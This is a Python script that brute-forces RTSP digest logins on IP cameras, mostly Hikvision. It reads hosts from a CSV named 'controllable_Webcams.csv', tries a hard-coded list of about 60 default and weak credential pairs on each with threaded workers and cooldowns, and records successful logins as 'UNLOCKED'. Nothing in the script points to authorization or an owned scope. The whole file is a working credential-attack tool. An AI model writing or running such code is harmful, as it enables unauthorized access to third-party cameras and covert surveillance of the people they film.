"""Hikvision-specific RTSP BF.

Many of the 51 RTSP cams in master CSV are Hikvision. Try Hikvision-specific creds.
"""

import socket
import re
import csv
import hashlib
import secrets
import time
import base64
import concurrent.futures
import json
import os

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
MASTER_CSV = os.path.join(WORKDIR, "controllable_Webcams.csv")
BF_RESULTS = os.path.join(WORKDIR, "camera_testing", "hikvision_rtsp_bf.json")
PROGRESS_PATH = os.path.join(WORKDIR, "camera_testing", "hikvision_rtsp_bf_progress.json")

# Hikvision-specific creds
HIK_CREDS = [
    ("admin", "12345"),       # Most common Hikvision default
    ("admin", "admin"),       # Common admin/admin
    ("admin", "hik12345"),
    ("admin", "hikvision"),
    ("admin", "Hik12345"),
    ("admin", "Hikvision"),
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", "1234567"),
    ("admin", "12345678"),
    ("admin", "123456789"),
    ("admin", "1234567890"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "admin12345"),
    ("admin", "passw0rd"),
    ("admin", "default"),
    ("admin", ""),
    ("admin", "camera"),
    ("admin", "abc123"),
    ("admin", "qwerty"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "changeme"),
    ("admin", "system"),
    ("admin", "manager"),
    ("admin", "operator"),
    ("admin", "supervisor"),
    ("admin", "administrator"),
    ("admin", "1111"),
    ("admin", "111111"),
    ("admin", "9999"),
    ("admin", "99999"),
    ("admin", "0000"),
    ("admin", "666666"),
    ("admin", "888888"),
    # Dahua creds
    ("admin", "admin123"),
    ("admin", "dahuadefault"),
    # Chinese defaults
    ("admin", "a123456"),
    ("admin", "abcd1234"),
    # 2024 common
    ("admin", "Admin123"),
    ("admin", "Admin12345"),
    ("admin", "Admin@123"),
    # Root
    ("root", "hik12345"),
    ("root", "12345"),
    ("root", ""),
    ("root", "root"),
    ("root", "pass"),
    ("root", "hikvision"),
    # User
    ("user", "user"),
    ("user", ""),
    # Empty
    ("", ""),
    # Hidden
    ("admin1", "12345"),
    ("admin2", "12345"),
    ("admin1", ""),
    ("admin2", ""),
    # Service
    ("service", "service"),
    ("service", ""),
]


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def load_progress():
    if os.path.exists(PROGRESS_PATH):
        try:
            with open(PROGRESS_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"tested": {}, "unlocked": 0}


def save_progress(p):
    try:
        tmp = PROGRESS_PATH + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(p, f)
        os.replace(tmp, PROGRESS_PATH)
    except Exception:
        pass


def load_results():
    if os.path.exists(BF_RESULTS):
        try:
            with open(BF_RESULTS, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_results(r):
    try:
        tmp = BF_RESULTS + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(r, f, indent=2)
        os.replace(tmp, BF_RESULTS)
    except Exception:
        pass


def get_challenge(host, port, path='/stream1', timeout=4):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        if b'401' not in data[:100]:
            return None
        m = re.search(rb'WWW-Authenticate:\s*(\w+)\s+(.+)', data)
        if not m:
            return None
        scheme = m.group(1).decode()
        params_str = m.group(2).decode()
        params = {}
        for match in re.finditer(r'(\w+)="?([^",]+)"?', params_str):
            params[match.group(1)] = match.group(2)
        return {"scheme": scheme, "params": params}
    except Exception:
        pass
    return None


def try_digest(host, port, path, user, pw, realm, nonce, timeout=4):
    try:
        ha1 = md5(f"{user}:{realm}:{pw}")
        ha2 = md5(f"DESCRIBE:rtsp://{host}:{port}{path}")
        nc = "00000001"
        cnonce = secrets.token_hex(8)
        response = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
        auth = (
            f'Digest username="{user}", realm="{realm}", '
            f'nonce="{nonce}", uri="rtsp://{host}:{port}{path}", '
            f'algorithm=MD5, qop=auth, nc={nc}, cnonce="{cnonce}", '
            f'response="{response}"'
        )
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'DESCRIBE rtsp://{host}:{port}{path} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth}\r\nUser-Agent: Mozilla/5.0\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while b'\r\n\r\n' not in data and len(data) < 5000:
                d = sock.recv(1024)
                if not d:
                    break
                data += d
        except socket.timeout:
            pass
        sock.close()
        if b'RTSP/1.0 200' in data:
            return True
    except Exception:
        pass
    return False


def bf_host(host_port, progress):
    host, port = host_port
    key = f"{host}:{port}"
    if key in progress.get("tested", {}):
        return None
    progress.setdefault("tested", {})[key] = True

    challenge = get_challenge(host, port)
    if not challenge:
        return None

    scheme = challenge["scheme"]
    realm = challenge["params"].get("realm", "User")
    nonce = challenge["params"].get("nonce", "")

    # Test Hikvision creds with cooldown
    for user, pw in HIK_CREDS:
        if not user:
            continue
        try:
            if scheme.lower() == "digest":
                if try_digest(host, port, '/stream1', user, pw, realm, nonce):
                    return {
                        "host": host,
                        "port": port,
                        "user": user,
                        "pass": pw,
                        "scheme": scheme,
                        "realm": realm,
                        "evidence": f"Hikvision auth bypass: {user}:{pw}",
                    }
            time.sleep(0.7)  # Cooldown
        except Exception:
            time.sleep(1)
            continue
    return None


def main():
    print(f"[Hikvision RTSP BF] Loading {MASTER_CSV}")
    csv.field_size_limit(2**31 - 1)
    with open(MASTER_CSV, "r", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))

    targets = set()
    for row in rows:
        url = row.get("url", "")
        live_url = row.get("live_stream_url", "")
        for u in [url, live_url]:
            if "rtsp://" in u:
                m = re.search(r'rtsp://([^:/]+):?(\d+)?', u)
                if m:
                    host = m.group(1)
                    port = int(m.group(2)) if m.group(2) else 554
                    targets.add((host, port))
                    break

    targets = sorted(targets)
    print(f"[Hikvision RTSP BF] {len(targets)} unique RTSP hosts")
    print(f"[Hikvision RTSP BF] {len(HIK_CREDS)} Hikvision-focused creds per host")

    progress = load_progress()
    results = load_results()

    todo = []
    for host, port in targets:
        key = f"{host}:{port}"
        if key not in progress.get("tested", {}):
            todo.append((host, port))

    print(f"[Hikvision RTSP BF] {len(todo)} hosts to test")

    unlocked = 0
    completed = 0
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(bf_host, (h, p), progress): (h, p) for h, p in todo}
        for fut in concurrent.futures.as_completed(futures):
            try:
                result = fut.result(timeout=600)
            except Exception:
                result = None
            completed += 1
            if result:
                key = f"{result['host']}:{result['port']}"
                results[key] = result
                unlocked += 1
                progress["unlocked"] = progress.get("unlocked", 0) + 1
                print(f"  [{completed}/{len(todo)}] UNLOCKED: {key} via {result['user']}:{result['pass']}")
            if completed % 3 == 0:
                save_progress(progress)
                save_results(results)
                elapsed = time.time() - start
                rate = completed / max(elapsed, 1)
                eta = (len(todo) - completed) / max(rate, 0.01)
                print(f"  Progress: {completed}/{len(todo)}, unlocked {unlocked}, {rate:.2f}/s, ETA: {eta:.0f}s")

    save_progress(progress)
    save_results(results)
    print(f"\n[Hikvision RTSP BF] Done. Unlocked {unlocked}/{len(todo)}.")


if __name__ == "__main__":
    main()
